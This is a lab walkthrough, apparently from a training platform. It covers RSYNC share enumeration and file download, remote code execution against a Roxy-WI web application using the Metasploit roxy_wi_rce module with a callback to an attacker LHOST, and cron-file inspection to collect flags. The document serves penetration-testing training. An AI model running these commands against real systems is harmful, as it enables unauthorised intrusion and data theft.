

## 1. Lab Overview

This lab focuses on RSYNC enumeration, web application exploitation, and Linux post-exploitation.

**Target Machines:**
- `target1.ine.local`
- `target2.ine.local`

**Objectives:**
- Enumerate the RSYNC service and retrieve flags.
- Explore exposed files and directories.
- Exploit the Roxy-WI web application using Metasploit.
- Investigate scheduled tasks to find the final flag.

## 2. Tools Used
- Nmap
- RSYNC
- Metasploit Framework

## 3. Target 1 – RSYNC Enumeration

**Step 1: Scan the target**

nmap -sSCV target1.ine.local

**Step 2: Enumerate RSYNC**

rsync rsync://target1.ine.local

This displays available RSYNC modules and helps identify the first flag.

**Step 3: Explore the shared files**

rsync rsync://target1.ine.local/backupwscohen/

Download the shared files:

rsync -av rsync://target1.ine.local/backupwscohen/ ./backup/

Examine the downloaded files to locate the second flag.

## 4. Target 2 – Roxy-WI Exploitation

**Step 1: Scan the second target**

nmap -sSCV -Pn target2.ine.local

The scan identifies the Roxy-WI web application.

**Step 2: Search for the exploit**

msfconsole
search roxy_wi

**Step 3: Configure the exploit**

use exploit/linux/http/roxy_wi_rce

show options

set RHOSTS target2.ine.local

set LHOST <_Kali_IP>

**Step 4: Execute the exploit**

run

A successful exploit provides a Meterpreter session.

## 5. Flag 3 – Post-Exploitation

Navigate to the root directory and Read the third flag:

## 6. Flag 4 – Cron Job Enumeration

Investigate scheduled tasks:

ls -la /etc/cron.d/

Examine the discovered cron job configuration files and Inspect the contents to locate the final flag.

## 7. Key Learnings

- Nmap service enumeration.
- RSYNC banner and share enumeration.
- Downloading exposed files.
- Metasploit exploit selection and configuration.
- Roxy-WI Remote Code Execution.
- Meterpreter session handling.
- Linux cron job enumeration.

## 8. Conclusion

This lab provided practical experience in identifying exposed RSYNC services, retrieving sensitive files, exploiting a vulnerable web application, and investigating Linux scheduled tasks.

